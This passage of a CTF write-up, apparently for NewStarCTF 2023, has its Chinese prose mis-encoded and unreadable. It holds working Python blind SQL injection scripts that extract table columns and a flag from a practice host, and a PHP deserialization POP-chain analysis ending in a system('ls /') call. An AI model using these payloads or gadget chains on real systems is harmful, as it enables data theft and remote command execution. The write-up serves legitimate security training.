class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¬¬1å¼ è¡¨çš„åå­—ä¸ºgrades,here_is_flag<br>[&#x27;grades,here_is_flag           &#x27;]<br></code></pre></td></tr></table></figure><p>çˆ†è¡¨çš„å­—æ®µ:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;here_is_flagç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;here_is_flag&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;here_is_flag&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>                <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((selEct(GROUP_CONCAT(COLUMN_NAME))frOm(infOrmation_schema.COLUMNS)wHere(TABLE_NAME=&#x27;here_is_flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.05</span>)<br>                <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>                true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—:flag<br>&#123;&#x27;here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—&#x27;: &#x27;flag                                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µçš„å€¼:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ctf&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;here_is_flag&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((seLEct(Group_cOncAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload3)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010215536171.png" alt="image-20231010215536171"></p><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å­—ç¬¦ä¸²æ¯”è¾ƒå¯ä»¥è°ƒç”¨__toString()å‡½æ•°=&gt;$this-&gt;name=new Then()</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨ç±»è°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå¯åŠ¨__invoke()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å¯ä»¥æŒ‡å®šç±»çš„å‡½æ•°end()å‡½æ•°è°ƒç”¨</span><br>        <span class="hljs-comment">//$this-&gt;obj=new CTF()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//getSträ¸ºHandleç±»çš„ä¸å­˜åœ¨å‡½æ•°æ‰€ä»¥å¯ä»¥ç”¨äºè°ƒç”¨__call</span><br>        <span class="hljs-comment">//$this-&gt;obj=new Handle()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å˜é‡åˆ é™¤å‡½æ•°å¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•__unset</span><br>        <span class="hljs-comment">//$this-&gt;handle-&gt;log=$WhiteGod-&gt;$func</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å­˜åœ¨å±é™©å‡½æ•°æ³¨å…¥=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br><br></code></pre></td></tr></table></figure><p>popé“¾æ„é€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.WhiteGod-&gt;__unset<br>2.CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>3.Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>4.Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>5.Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>6.Begin-&gt;__destruct=&gt;Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br></code></pre></td></tr></table></figure><p>é­”æœ¯å‡½æ•°ä»‹ç»:</p><p>__unsetï¼ˆï¼‰é­”æœ¯æ–¹æ³•:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">__unset()é­”æœ¯æ–¹æ³•åœ¨ä½¿ç”¨unset()å‡½æ•°åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«unsetæ—¶ï¼Œå¦‚æœè¯¥å¯¹è±¡å®šä¹‰äº†__unset()æ–¹æ³•ï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> 